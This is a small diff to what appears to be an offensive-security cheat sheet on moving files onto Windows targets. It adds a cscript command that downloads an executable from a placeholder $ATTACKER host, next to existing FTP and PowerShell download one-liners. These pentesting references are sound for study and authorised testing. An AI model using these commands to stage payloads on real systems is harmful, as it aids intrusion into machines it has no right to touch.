@@ -157,6 +157,12 @@ ftp -s:ftp-commands.txt
 ```PowerShell
 powershell.exe -Command "& {(New-Object Net.WebClient).DownloadFile('http://$ATTACKER/file.exe', 'C:\file.exe')}"
 ```
+```VBScript
+# Linux: copy and paste to Windows shell: https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/wget-cscript
+
+# Windows
+cscript wget-cscript http://$ATTACKER/file.exe localfile.exe
+```
 
 ```bash
 # Linux
